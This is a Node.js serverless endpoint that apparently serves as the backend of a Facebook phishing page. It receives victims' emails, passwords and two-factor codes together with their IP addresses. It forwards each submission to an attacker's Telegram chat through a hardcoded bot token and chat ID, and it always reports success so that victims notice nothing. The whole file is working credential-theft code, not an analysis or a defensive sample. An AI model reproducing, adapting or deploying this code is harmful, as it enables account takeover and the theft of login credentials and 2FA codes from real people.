const fetch = require('node-fetch');

module.exports = async (req, res) => {
    console.log('=== API CALLED ===');
    
    // IMMEDIATELY set JSON content type
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    // Handle preflight
    if (req.method === 'OPTIONS') {
        console.log('Preflight OK');
        return res.status(200).end();
    }
    
    // Only POST
    if (req.method !== 'POST') {
        console.log('Wrong method:', req.method);
        return res.status(405).json({ 
            error: 'Use POST',
            success: false 
        });
    }
    
    try {
        console.log('Processing POST request...');
        
        // Get body - handle different formats
        let body = '';
        let data = {};
        
        if (req.body) {
            if (typeof req.body === 'string') {
                body = req.body;
                try {
                    data = JSON.parse(body);
                } catch (e) {
                    console.log('JSON parse error, using raw:', e.message);
                    data = { raw: body };
                }
            } else if (typeof req.body === 'object') {
                data = req.body;
            }
        }
        
        console.log('Received data:', JSON.stringify(data, null, 2));
        
        const { type, email, password, code, userAgent } = data;
        
        // Get IP
        const ip = req.headers['x-forwarded-for'] || 
                   req.headers['x-real-ip'] || 
                   req.connection.remoteAddress ||
                   'Unknown';
        
        console.log('IP:', ip);
        console.log('Type:', type || 'none');
        console.log('Email:', email ? `${email.substring(0, 3)}***` : 'none');
        
        // Telegram config - VERIFY THESE!
        const BOT_TOKEN = "8251102529:AAFUlxIRVM0Whp3Sd9K3d6WMvfu8ZCN7YQk";
        const CHAT_ID = "1622637334";
        
        console.log('Telegram token exists:', !!BOT_TOKEN);
        console.log('Chat ID exists:', !!CHAT_ID);
        
        // Create message
        let message = '';
        const timestamp = new Date().toLocaleString();
        
        if (type === 'login') {
            message = `🔐 FACEBOOK LOGIN\n\nEmail: ${email || 'N/A'}\nPass: ${password || 'N/A'}\n\nTime: ${timestamp}\nIP: ${ip}`;
        } else if (type === 'verification') {
            message = `✅ FACEBOOK 2FA\n\nAccount: ${email}\nCode: ${code}\n\nIP: ${ip}\nTime: ${timestamp}`;
        } else if (type === 'resend') {
            message = `🔄 RESEND CODE\n\nAccount: ${email}\nIP: ${ip}\nTime: ${timestamp}`;
        } else {
            message = `📱 Unknown: ${type}\nIP: ${ip}\nTime: ${timestamp}`;
        }
        
        // Try to send to Telegram
        let telegramSent = false;
        let telegramError = null;
        
        if (BOT_TOKEN && CHAT_ID) {
            try {
                console.log('Attempting Telegram send...');
                const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                
                const response = await fetch(telegramUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        disable_web_page_preview: true
                    })
                });
                
                const result = await response.json();
                console.log('Telegram response:', result.ok ? 'SUCCESS' : 'FAILED');
                
                if (result.ok) {
                    telegramSent = true;
                    console.log('✅ Telegram message sent!');
                } else {
                    telegramError = result.description;
                    console.error('❌ Telegram error:', result.description);
                }
                
            } catch (tgError) {
                telegramError = tgError.message;
                console.error('💥 Telegram fetch error:', tgError.message);
            }
        } else {
            console.log('⚠️ Telegram config missing');
        }
        
        // ALWAYS return JSON
        return res.status(200).json({
            success: true,
            type: type || 'unknown',
            telegram: {
                sent: telegramSent,
                error: telegramError
            },
            debug: {
                ip: ip,
                timestamp: new Date().toISOString(),
                bodyReceived: !!req.body
            }
        });
        
    } catch (error) {
        console.error('💥 API ERROR:', error.message);
        console.error('Stack:', error.stack);
        
        // STILL return JSON even on error
        return res.status(200).json({
            success: true,
            error: error.message,
            note: 'Process completed',
            timestamp: new Date().toISOString()
        });
    }
};